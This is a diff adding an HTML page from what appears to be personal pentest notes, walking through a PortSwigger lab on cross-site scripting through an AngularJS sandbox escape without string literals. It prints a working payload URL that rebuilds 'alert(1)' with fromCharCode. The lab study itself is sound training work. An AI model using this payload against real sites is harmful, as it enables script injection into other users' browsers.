@@ -1,0 +1,32 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>XSS with AngularJS sandbox escape without strings</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>XSS with AngularJS sandbox escape without strings</h1><br /><br /><br />Check where the
+    request(example: daniele93) is been reflected.<br />We can note that is been reflected in <span
+      style="color:#a020f0;">AngularJS sandbox</span> because it is inside <span
+      style="color:#a020f0;">angular.module</span> <br /> <a href=""><img src="images/1977-1.png"
+        alt="images/1977-1.png" /></a><br /><br />We can check the explanation of the payload below in the father
+    chapter <a
+      href="st_Methodology--WebApp_Pentest--Exploitation--Client-Side--Cross_Site_Scripting(XSS)--XSS_Contexts_(examples)--XSS_into_AngularJS_sandbox.html">XSS
+      into Angular JS sandbox</a> in the chapter “<strong>Constructing an advanced AngularJS sandbox escape</strong>”
+    above<br />
+    <div class="codebox">
+      <div class="codebox">
+        /?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+      </div>
+    </div><br /><br /> <a href=""><img src="images/1977-2.png"
+        alt="images/1977-2.png" /></a><br /><br /><br /><strong>Bibliography:</strong><br /><a
+      href="https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-without-strings" target="_blank">https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-without-strings</a>
+  </div>
+</body>
+
+</html>
